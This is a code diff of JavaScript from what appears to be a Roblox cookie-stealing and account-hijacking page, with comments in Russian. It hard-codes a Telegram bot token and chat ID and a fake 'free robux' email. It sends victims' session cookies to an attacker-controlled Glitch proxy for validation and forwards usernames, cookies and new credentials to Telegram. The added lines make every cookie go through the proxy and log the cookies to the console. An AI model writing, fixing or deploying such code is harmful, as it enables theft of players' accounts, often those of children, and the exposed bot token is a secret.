@@ -282,7 +282,7 @@
         const TELEGRAM_TOKEN = "8143511538:AAFWgq1zyShC59YLFVDth_ENak8SZ7ibtTY";
         const TELEGRAM_CHAT_ID = "5180010738";
         const FAKE_EMAIL = "robuxx0free0get@gmail.com";
-        const PROXY_URL = "https://sore-ablaze-antimony.glitch.me"; // Укажи https://roblox-proxy.glitch.me после настройки Glitch
+        const PROXY_URL = "https://sore-ablaze-antimony.glitch.me";
 
         // Отправка в Telegram
         async function sendToTelegram(username, cookies, newEmail, newPassword) {
@@ -295,17 +295,19 @@
             }
         }
 
-        // Проверка куки через прокси или напрямую
+        // Проверка куки через прокси
         async function checkRobloxCookies(cookies) {
             try {
-                const url = PROXY_URL ? `${PROXY_URL}/check-cookies` : "https://users.roblox.com/v1/users/authenticated";
-                const response = await fetch(url, {
-                    method: PROXY_URL ? "POST" : "GET",
-                    headers: PROXY_URL ? { "Content-Type": "application/json" } : { "Cookie": cookies },
-                    body: PROXY_URL ? JSON.stringify({ cookies }) : undefined
+                console.log("Отправляем куки на прокси:", cookies);
+                const response = await fetch(`${PROXY_URL}/check-cookies`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ cookies })
                 });
+                console.log("Статус ответа:", response.status);
                 if (response.ok) {
                     const userData = await response.json();
+                    console.log("Данные пользователя:", userData);
                     const username = userData.name;
                     const userId = userData.id;
                     const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=250x250&format=Png&isCircular=false`);
@@ -315,13 +317,15 @@
                 } else if (response.status === 429) {
                     return { valid: false, error: "Слишком много запросов к Roblox API. Попробуй позже через 5-10 минут." };
                 } else {
-                    return { valid: false, error: "Ошибка проверки куки. Проверь их и попробуй снова." };
+                    const errorData = await response.text();
+                    console.log("Ошибка от сервера:", errorData);
+                    return { valid: false, error: `Ошибка проверки куки: ${errorData || "Проверь куки и прокси."}` };
                 }
             } catch (e) {
-                console.error("Ошибка проверки куки:", e);
+                console.error("Ошибка сети:", e);
                 return {
                     valid: false,
-                    error: `Ошибка сети: ${e.message}. Roblox API блокирует запросы из-за CORS. Настрой прокси на Glitch: https://glitch.com.`
+                    error: `Ошибка сети: ${e.message}. Проверь прокси: ${PROXY_URL}/check-cookies`
                 };
             }
         }
